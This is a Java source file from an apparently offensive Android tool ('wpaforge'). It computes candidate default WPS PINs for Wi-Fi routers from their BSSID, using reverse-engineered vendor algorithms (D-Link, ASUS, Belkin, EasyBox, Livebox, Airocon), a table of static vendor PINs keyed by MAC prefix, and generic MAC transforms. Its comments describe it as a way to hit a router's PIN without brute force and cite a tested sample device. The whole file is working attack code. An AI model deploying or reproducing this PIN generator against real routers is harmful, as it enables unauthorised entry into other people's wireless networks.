package io.github.wlmosv_png.wpaforge.wps;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

/**
 * 厂商默认 WPS PIN 算法库。
 *
 * 来源：3WiFi WPS PIN Generator（https://3wifi.stascorp.com/wpspin）的算法集合，
 * 经 fr0stb1rd 的 Python 移植（github.com/fr0stb1rd/3wifi-wpspin）取出并改写为 Java。
 * 算法本身是逆向厂商固件得到的，不是猜的。
 *
 * 为什么这块最值钱：很多路由器的出厂 PIN 是由 MAC 派生的固定值 ——
 * 本地算出 1 个候选就能命中，完全不用碰 10^7 的穷举。
 * 本机实测样本（BSSID 5C:A0:02:B5:8F:65，华为 E5576）：
 *   18987256 / 54531574 / 66559252 …… 共 30+ 个候选。
 *
 * 纯逻辑、不碰 Android API，可离线测试。
 */
public final class WpsVendorPins {

    private WpsVendorPins() {
    }

    /** 一个候选 PIN 及其出处。 */
    public static final class Candidate {
        public final String pin;
        public final String algo;
        /** true = 该算法只在 OUI 命中时才输出（厂商专属/固定值） */
        public final boolean viaOui;

        Candidate(String pin, String algo, boolean viaOui) {
            this.pin = pin;
            this.algo = algo;
            this.viaOui = viaOui;
        }

        public String describe() {
            return pin + "  (" + algo + ")";
        }
    }

    // ---------------- 基础工具 ----------------

    /** 去掉分隔符并大写；失败返回空串。 */
    static String norm(String bssid) {
        if (bssid == null) return "";
        return bssid.replace(":", "").replace("-", "").replace(".", "")
                .replace(" ", "").trim().toUpperCase(Locale.ROOT);
    }

    /** BSSID → 48 位整数；非法返回 -1。 */
    static long macOf(String bssid) {
        String s = norm(bssid);
        if (s.length() != 12) return -1;
        try {
            return Long.parseLong(s, 16);
        } catch (Throwable t) {
            return -1;
        }
    }

    /** 48 位整数 → 12 位大写 hex。 */
    static String hex12(long mac) {
        String s = Long.toHexString(mac & 0xFFFFFFFFFFFFL).toUpperCase(Locale.ROOT);
        StringBuilder sb = new StringBuilder();
        for (int i = s.length(); i < 12; i++) sb.append('0');
        return sb.append(s).toString();
    }

    static String hexN(long mac, int digits) {
        String s = Long.toHexString(mac & 0xFFFFFFFFFFFFL).toUpperCase(Locale.ROOT);
        StringBuilder sb = new StringBuilder();
        for (int i = s.length(); i < digits; i++) sb.append('0');
        sb.append(s);
        return sb.substring(sb.length() - digits);
    }

    static int[] bytesOf(long mac) {
        String s = hex12(mac);
        int[] b = new int[6];
        for (int i = 0; i < 6; i++) b[i] = (int) Long.parseLong(s.substring(i * 2, i * 2 + 2), 16);
        return b;
    }

    /** 按字符反转（= 半字节序反转）。 */
    static String reverse(String s) {
        return new StringBuilder(s).reverse().toString();
    }

    /**
     * 按字节反转（每 2 个 hex 字符一组）。
     * 注意和 reverse() 不是一回事 —— Python 版里 `Reverse byte` 用前者、
     * `Reverse nibble` 用后者，我第一版混用了，离线基准立刻抓出来。
     */
    static String reverseBytes(String s) {
        StringBuilder sb = new StringBuilder();
        for (int i = s.length(); i >= 2; i -= 2) {
            sb.append(s, i - 2, i);
        }
        return sb.toString();
    }

    static long reverseBits(long v, int bits) {
        long r = 0;
        for (int i = 0; i < bits; i++) {
            r = (r << 1) | ((v >> i) & 1L);
        }
        return r;
    }

    /**
     * 前 7 位 → 带校验位的 8 位 PIN。
     * 所有算法算出来的都是「前 7 位」，第 8 位统一由 WPS 校验位规则补。
     */
    static String complete(long first7) {
        long p = Math.floorMod(first7, 10000000L);
        String s = Long.toString(p);
        StringBuilder sb = new StringBuilder();
        for (int i = s.length(); i < 7; i++) sb.append('0');
        sb.append(s);
        return WpsPins.complete(sb.toString());
    }

    // ---------------- 算法 ----------------

    /** D-Link：对 NIC 做一串 XOR，再保证是 7 位。 */
    static long dlink(long mac) {
        long m = mac & 0xFFFFFFL;
        m ^= 0x55AA55L;
        m ^= (((m & 0xFL) << 4) | ((m & 0xFL) << 8) | ((m & 0xFL) << 12)
                | ((m & 0xFL) << 16) | ((m & 0xFL) << 20));
        m %= 10000000L;
        if (m < 1000000L) {
            m += ((m % 9L) * 1000000L) + 1000000L;
        }
        return m;
    }

    /** ASUS：每位的模数随前 5 字节之和变化。 */
    static long asus(long mac) {
        int[] b = bytesOf(mac);
        int sum = b[1] + b[2] + b[3] + b[4] + b[5];
        StringBuilder pin = new StringBuilder();
        for (int i = 0; i < 7; i++) {
            int mod = 10 - ((i + sum) % 7);
            if (mod <= 0) mod = 1;
            pin.append((b[i % 6] + b[5]) % mod);
        }
        try {
            return Long.parseLong(pin.toString());
        } catch (Throwable t) {
            return -1;
        }
    }

    /** Airocon（Realtek 代工）：相邻字节之和拼成 7 位。 */
    static long airocon(long mac) {
        int[] b = bytesOf(mac);
        return ((b[0] + b[1]) % 10L)
                + (((b[5] + b[0]) % 10L) * 10L)
                + (((b[4] + b[5]) % 10L) * 100L)
                + (((b[3] + b[4]) % 10L) * 1000L)
                + (((b[2] + b[3]) % 10L) * 10000L)
                + (((b[1] + b[2]) % 10L) * 100000L)
                + (((b[0] + b[1]) % 10L) * 1000000L);
    }

    /**
     * 通用 DSL 家族算法（Belkin / EasyBox / Arcadyan / Livebox 共用一个骨架，
     * 只是 bx 位掩码不同）。逆向自 Stas'M，照着 Python 版逐行搬。
     *
     * @param sn 序列号（可空；空则用 MAC 低位兜底，见各调用点）
     */
    static long dslMacSn(long mac, String sn, int[] bx, int bk1, int bk2) {
        String s = sn == null ? "" : sn;
        if (s.length() < 4) {
            StringBuilder sb = new StringBuilder();
            for (int i = s.length(); i < 4; i++) sb.append('0');
            s = sb.append(s).toString();
        }
        if (s.length() > 4) s = s.substring(s.length() - 4);

        int[] snNib = new int[4];
        for (int i = 0; i < 4; i++) {
            int v;
            try {
                v = Integer.parseInt(s.substring(i, i + 1), 16);
            } catch (Throwable t) {
                v = 0;
            }
            snNib[i] = v;
        }

        int[] nic = new int[]{
                (int) ((mac & 0xFFFFL) >> 12),
                (int) ((mac & 0xFFFL) >> 8),
                (int) ((mac & 0xFFL) >> 4),
                (int) (mac & 0xFL)
        };

        int k1 = 0;
        int t = bk1;
        int i = 0;
        while (t != 0) {
            if ((t & 1) != 0) {
                k1 += nib(i, nic, snNib);
                k1 &= 0xF;
            }
            t >>= 1;
            i++;
        }

        int k2 = 0;
        t = bk2;
        i = 0;
        while (t != 0) {
            if ((t & 1) != 0) {
                k2 += nib(i, nic, snNib);
                k2 &= 0xF;
            }
            t >>= 1;
            i++;
        }

        long pin = 0;
        for (int mask : bx) {
            int xor = 0;
            int j = 0;
            int m2 = mask;
            while (m2 != 0) {
                if ((m2 & 1) != 0) {
                    if (j > 4) xor ^= nib(j - 4, nic, snNib);
                    else if (j > 1) xor ^= nic[j - 1];
                    else if (j > 0) xor ^= k2;
                    else xor ^= k1;
                }
                m2 >>= 1;
                j++;
            }
            pin = (pin << 4) | (xor & 0xFL);
        }
        return pin % 10000000L;
    }

    private static int nib(int i, int[] nic, int[] snNib) {
        if (i < 4) return i >= 0 && i < 4 ? nic[i] : 0;
        int k = i - 4;
        return (k >= 0 && k < snNib.length) ? snNib[k] : 0;
    }

    /** 一个通用（不依赖 OUI）算法。 */
    private interface Calc {
        long run(long mac, String sn);
    }

    private static final class Algo {
        final String name;
        final Calc calc;

        Algo(String name, Calc calc) {
            this.name = name;
            this.calc = calc;
        }
    }

    /** 只跑通用算法：任何 MAC 都能算，不依赖 OUI 命中。 */
    static List<Algo> genericAlgos() {
        List<Algo> a = new ArrayList<>();

        for (int bits : new int[]{24, 28, 32, 36, 40, 44, 48}) {
            final int n = bits;
            final long mask = (bits == 48) ? 0xFFFFFFFFFFFFL : ((1L << bits) - 1);
            a.add(new Algo(n + "-bit PIN", (mac, sn) -> mac & mask));
        }

        a.add(new Algo("Reverse byte 24-bit", (mac, sn) ->
                Long.parseLong(reverseBytes(hexN(mac & 0xFFFFFFL, 6)), 16)));
        a.add(new Algo("Reverse byte 32-bit", (mac, sn) ->
                Long.parseLong(reverseBytes(hexN(mac & 0xFFFFFFFFL, 8)), 16)));
        a.add(new Algo("Reverse byte 48-bit", (mac, sn) ->
                Long.parseLong(reverseBytes(hex12(mac)), 16)));

        a.add(new Algo("Reverse nibble 24-bit", (mac, sn) ->
                Long.parseLong(reverse(hexN(mac & 0xFFFFFFL, 6)), 16) & 0xFFFFFFL));
        a.add(new Algo("Reverse nibble 32-bit", (mac, sn) ->
                Long.parseLong(reverse(hexN(mac & 0xFFFFFFFFL, 8)), 16) & 0xFFFFFFFFL));
        a.add(new Algo("Reverse nibble 48-bit", (mac, sn) ->
                Long.parseLong(reverse(hex12(mac)), 16)));

        a.add(new Algo("Reverse bits 24-bit", (mac, sn) -> reverseBits(mac & 0xFFFFFFL, 24)));
        a.add(new Algo("Reverse bits 32-bit", (mac, sn) -> reverseBits(mac & 0xFFFFFFFFL, 32)));
        a.add(new Algo("Reverse bits 48-bit", (mac, sn) -> reverseBits(mac & 0xFFFFFFFFFFFFL, 48)));

        a.add(new Algo("D-Link PIN", (mac, sn) -> dlink(mac)));
        a.add(new Algo("D-Link PIN +1", (mac, sn) -> dlink(mac + 1)));
        a.add(new Algo("Inv NIC to PIN", (mac, sn) -> (~mac) & 0xFFFFFFL));
        a.add(new Algo("NIC * 2", (mac, sn) -> (mac & 0xFFFFFFL) * 2));
        a.add(new Algo("NIC * 3", (mac, sn) -> (mac & 0xFFFFFFL) * 3));

        a.add(new Algo("OUI + NIC", (mac, sn) -> {
            long macL = mac & 0xFFFFFFFFFFFFL;
            long oui = macL >>> 24;
            long nic = macL & 0xFFFFFFL;
            return (oui + nic) % 0x1000000L;
        }));
        a.add(new Algo("OUI - NIC", (mac, sn) -> {
            long macL = mac & 0xFFFFFFFFFFFFL;
            long oui = macL >>> 24;
            long nic = macL & 0xFFFFFFL;
            return nic < oui ? (oui - nic) : ((oui + 0x1000000L - nic) & 0xFFFFFFL);
        }));
        a.add(new Algo("OUI ^ NIC", (mac, sn) -> {
            long macL = mac & 0xFFFFFFFFFFFFL;
            return (macL >>> 24) ^ (macL & 0xFFFFFFL);
        }));

        return a;
    }

    /** OUI 专属算法（只在 MAC 以某个前缀开头时才输出）。 */
    private static final class OuiAlgo {
        final String name;
        final String prefixes;   // 空格分隔的 hex 前缀（6 或更长）
        final Calc calc;
        final int[] bx;
        final int bk1;
        final int bk2;
        final boolean usesSn;

        OuiAlgo(String name, String prefixes, Calc calc, boolean usesSn) {
            this(name, prefixes, calc, null, 60, 195, usesSn);
        }

        OuiAlgo(String name, String prefixes, Calc calc, int[] bx, int bk1, int bk2, boolean usesSn) {
            this.name = name;
            this.prefixes = prefixes;
            this.calc = calc;
            this.bx = bx;
            this.bk1 = bk1;
            this.bk2 = bk2;
            this.usesSn = usesSn;
        }
    }

    private static final String P_DLINK =
            "0014D1 14D64D 1C7EE5 28107B 84C9B2 A0AB1B B8A386 C0A0BB CCB255 D8EB97 FC7516";
    private static final String P_DLINK1 =
            "0014D1 0018E7 00195B 001CF0 001E58 002191 0022B0 002401 00265A 14D64D 1C7EE5 "
                    + "340804 5CD998 84C9B2 B8A386 C8BE19 C8D3A3 CCB255";
    private static final String P_BELKIN = "08863B 94103E B4750E C05627 EC1A59";
    private static final String P_EASYBOX = "00264D 38229D 7C4FB5";
    private static final String P_LIVEBOX =
            "1883BF 488D36 4C09D4 507E5D 5CDC96 743170 849CA6 880355 9C80DF A8D3F7 D0052A D463FE";
    private static final String P_ASUS =
            "00072624 0008A1D3 00177C 001EA6 00304FB 00E04C0 048D38 049226 04D9F5 081077 "
                    + "081078 081079 083E5D 08606E 0862669 107B44 10BF48 10C37B 10FEED3C 14DDA9 "
                    + "181E78 1C4419 1C872C 1CB72C 2420C7 247F20 2C56DC 2CAB25 2CFDA1 305A3A "
                    + "3085A98C 382C4A 38D547 3C1E04 40167E 40F201 44E9DD 48EE0C 50465D 5464D9 "
                    + "54A050 54B80A 587BE906 6045CB 60A44C 60D1AA21 64517E 64D954 6C198F 6C7220 "
                    + "6CFDB9 704D7B 7062B8 74D02B 7824AF 78542E 78D99FD 7C2664 803F5DF6 84A423 "
                    + "88A6C6 88D7F6 8C10D4 8C882B00 904D4A 907282 90F65290 94FBB2 9C5C8E A01B29 "
                    + "A0F3C1E A8F7E00 AC220B AC9E17 ACA213 B06EBF B85510 B8EE0E BC3400 BC9680 "
                    + "BCEE7B C0A0BB8C C412F5 C4A81D C860007 C891F9 D00ED90 D017C2 D084B0 D850E6 "
                    + "D8FEE3 E03F49 E4BEED E894F6F6 E8CC18 EC1A5971 EC2280 EC4C4D F0795978 F42853 "
                    + "F43E61 F46BEF F832E4 F8AB05 F8E903F4 FC8B97";
    private static final String P_AIROCON =
            "0007262F 000B2B4A 000EF4E7 001333B 00177C 001AEF 00E04BB3 02101801 0810734 "
                    + "08107710 1013EE0 2CAB25C7 788C54 803F5DF6 94FBB2 BC9680 F43E61 FC8B97";

    // 静态 PIN：某些厂商所有设备共用一个出厂 PIN，只要 OUI 对上就试这一个。
    private static final String[][] STATIC_PINS = {
            {"Cisco", "1234567", "001A2B 00248C 002618 344DEB 7054F5 7071BC E06995 E0CB4E"},
            {"Broadcom 1", "2017252", "001AA9 14144B 988B5D ACF1DF BCF685 C8D3A3 EC6264"},
            {"Broadcom 2", "4626484", "14D64D 1C7EE5 28107B 84C9B2 B8A386 BCF685 C8BE19"},
            {"Broadcom 3", "7622990", "14D64D 1C7EE5 28107B 7C034C B8A386 BCF685 C8BE19"},
            {"Broadcom 4", "6232714",
                    "14D64D 18622C 1C7EE5 204E7F 28107B 4C17EB 7C03D8 84C9B2 B8A386 BCF685 "
                            + "C8BE19 C8D3A3 CCB255 D86CE9 FC7516"},
            {"Broadcom 5", "1086411",
                    "14D64D 18622C 1C7EE5 204E7F 28107B 4C17EB 7C03D8 84C9B2 B8A386 BCF685 "
                            + "C8BE19 C8D3A3 CCB255 D86CE9 FC7516"},
            {"Broadcom 6", "3195719",
                    "14D64D 18622C 1C7EE5 204E7F 28107B 4C17EB 7C03D8 84C9B2 B8A386 BCF685 "
                            + "C8BE19 C8D3A3 CCB255 D86CE9 FC7516"},
            {"Airocon 1", "3043203", "181E78 40F201 44E9DD D084B0"},
            {"Airocon 2", "7141225", "84A423 88A6C6 8C10D4"},
            {"DSL-2740R", "6817554", "00265A 1CBDB9 340804 5CD998 84C9B2 FC7516"},
            {"Realtek 1", "9566146", "000C42 000EE8 0014D1"},
            {"Realtek 2", "9571911", "007263 E4BEED"},
            {"Realtek 3", "4856371", "08C6B3"},
            {"Upvel", "2085483", "784476 D4BF7F0 F8C091"},
            {"UR-814AC", "4397768", "D4BF7F60"},
            {"UR-825AC", "529417", "D4BF7F5"},
            {"Onlime", "9995604", "0014D1 144D67 784476 D4BF7F F8C091"},
            {"Edimax", "3561153", "00E04C 801F02"},
            {"Thomson", "6795814", "002624 4432C8 88F7C7 CC03FA"},
            {"HG532x", "3425928",
                    "00664B 086361 087A4C 0C96BF 14B968 2008ED 2469A5 346BD3 786A89 88E3AB "
                            + "9CC172 ACE215 CCA223 D07AB5 E8CD2D F80113 F83DFF"},
            {"H108L", "9422988", "4C09B4 4CAC0A 84742A4 9CD24B B075D5 C864C7 DC028E FCC897"},
            {"CBN ONO", "9575521", "5C353B DC537C"},
    };

    private static final int[] BX_BELKIN = {6, 129, 209, 10, 24, 3, 39};
    private static final int[] BX_EASYBOX = {129, 65, 6, 10, 136, 80, 33};

    // ---------------- 对外 ----------------

    /**
     * 生成候选 PIN。顺序 = 命中概率顺序：
     *   1. 厂商专属算法（OUI 命中才出，通常 0~3 个）
     *   2. 固定 PIN（OUI 命中才出）
     *   3. 通用算法（任何 MAC 都跑，约 20 个）
     * 去重，保持顺序。sn 可空。
     */
    public static List<Candidate> suggest(String bssid, String sn) {
        List<Candidate> out = new ArrayList<>();
        long mac = macOf(bssid);
        if (mac < 0) return out;
        String macHex = hex12(mac);

        List<OuiAlgo> ouiAlgos = new ArrayList<>();
        ouiAlgos.add(new OuiAlgo("D-Link PIN", P_DLINK, (m, s) -> dlink(m), false));
        ouiAlgos.add(new OuiAlgo("D-Link PIN +1", P_DLINK1, (m, s) -> dlink(m + 1), false));
        ouiAlgos.add(new OuiAlgo("ASUS PIN", P_ASUS, (m, s) -> asus(m), false));
        ouiAlgos.add(new OuiAlgo("Airocon Realtek", P_AIROCON, (m, s) -> airocon(m), false));
        ouiAlgos.add(new OuiAlgo("Belkin PIN", P_BELKIN,
                (m, s) -> dslMacSn(m, s, BX_BELKIN, 60, 195), true));
        ouiAlgos.add(new OuiAlgo("Vodafone EasyBox", P_EASYBOX,
                (m, s) -> dslMacSn(m, (s == null || s.isEmpty())
                        ? Long.toHexString(m & 0xFFFFL).toUpperCase(Locale.ROOT) : s,
                        BX_EASYBOX, 60, 195), true));
        ouiAlgos.add(new OuiAlgo("Livebox Arcadyan", P_LIVEBOX,
                (m, s) -> dslMacSn(m - 2, s, BX_EASYBOX, 60, 195), true));

        Map<String, Boolean> seen = new LinkedHashMap<>();

        for (OuiAlgo oa : ouiAlgos) {
            if (!prefixMatch(macHex, oa.prefixes)) continue;
            add(out, seen, oa.calc.run(mac, sn == null ? "" : sn), oa.name, true);
        }

        for (String[] sp : STATIC_PINS) {
            if (!prefixMatch(macHex, sp[2])) continue;
            try {
                add(out, seen, Long.parseLong(sp[1]), sp[0], true);
            } catch (Throwable ignored) {
            }
        }

        for (Algo g : genericAlgos()) {
            add(out, seen, g.calc.run(mac, sn == null ? "" : sn), g.name, false);
        }
        return out;
    }

    /** 只要通用算法（不依赖 OUI），用于「我不想让人猜 OUI」的场景。 */
    public static List<Candidate> suggestGeneric(String bssid) {
        List<Candidate> out = new ArrayList<>();
        long mac = macOf(bssid);
        if (mac < 0) return out;
        Map<String, Boolean> seen = new LinkedHashMap<>();
        for (Algo g : genericAlgos()) {
            add(out, seen, g.calc.run(mac, ""), g.name, false);
        }
        return out;
    }

    private static void add(List<Candidate> out, Map<String, Boolean> seen,
                            long first7, String algo, boolean viaOui) {
        if (first7 < 0) return;
        String pin = complete(first7);
        if (pin == null || pin.length() != 8) return;
        if (seen.containsKey(pin)) return;
        seen.put(pin, Boolean.TRUE);
        out.add(new Candidate(pin, algo, viaOui));
    }

    static boolean prefixMatch(String macHex, String prefixes) {
        if (prefixes == null || prefixes.isEmpty()) return false;
        for (String p : prefixes.split(" ")) {
            if (!p.isEmpty() && macHex.startsWith(p)) return true;
        }
        return false;
    }
}
